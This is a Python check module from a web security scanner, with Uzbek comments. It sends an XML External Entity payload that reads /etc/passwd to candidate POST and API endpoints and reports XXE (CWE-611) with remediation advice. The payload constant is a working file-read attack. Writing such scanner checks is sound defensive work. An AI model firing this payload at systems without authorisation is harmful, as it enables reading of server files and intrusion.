"""XXE — XML External Entity (XML tahlilchisi orqali fayl o'qish).

XXE aniqlash XML qabul qiluvchi endpoint talab qiladi. Bu tekshiruv XML qabul
qilishi mumkin bo'lgan POST endpointlarga tashqi entity bilan XML yuborib,
javobda fayl mazmuni qaytishini qidiradi. Bu — best-effort (ehtimoliy) tekshiruv.
"""

from __future__ import annotations

import re

from ..models import Finding, Severity
from . import Check, Context

XXE_PAYLOAD = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE nsq [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    "<nsq>&xxe;</nsq>"
)
PASSWD_SIG = re.compile(r"root:.*?:0:0:", re.M)


class XxeCheck(Check):
    name = "XXE"
    description = "XML endpointlarida tashqi entity orqali fayl o'qishni tekshiradi."

    def _candidate_endpoints(self, ctx: Context) -> set[str]:
        eps: set[str] = set()
        # XML/API ko'rinishidagi POST formalari va URL'lar
        for form in ctx.crawl.forms:
            if form.method == "post":
                eps.add(form.action)
        for url in ctx.crawl.pages:
            low = url.lower()
            if any(h in low for h in ("/api", "/xml", "/soap", "/rpc", "/rest", "/upload")):
                eps.add(url)
        return eps

    def run(self, ctx: Context) -> list[Finding]:
        if not ctx.active:
            return []
        findings: list[Finding] = []

        for endpoint in self._candidate_endpoints(ctx):
            # XML content-type bilan yuboramiz
            old_ct = ctx.client.session.headers.get("Content-Type")
            try:
                ctx.client.session.headers["Content-Type"] = "application/xml"
                resp = ctx.client.post(endpoint, data=XXE_PAYLOAD)
            finally:
                if old_ct is None:
                    ctx.client.session.headers.pop("Content-Type", None)
                else:
                    ctx.client.session.headers["Content-Type"] = old_ct

            if resp.ok and resp.text and PASSWD_SIG.search(resp.text):
                findings.append(
                    Finding(
                        check=self.name,
                        title=f"XXE — {endpoint}",
                        severity=Severity.CRITICAL,
                        url=endpoint,
                        description="Endpoint tashqi entity bilan XML'ni qayta ishladi va "
                        "server fayli (/etc/passwd) mazmunini qaytardi. Bu XXE — hujumchi "
                        "server fayllarini o'qishi, ichki so'rovlar (SSRF) yuborishi mumkin.",
                        remediation="XML tahlilchida tashqi entity va DTD'larni o'chiring "
                        "(masalan `defusedxml` yoki `disallow-doctype-decl`).",
                        cwe="CWE-611",
                        evidence="Javobda /etc/passwd mazmuni topildi.",
                    )
                )
        return findings
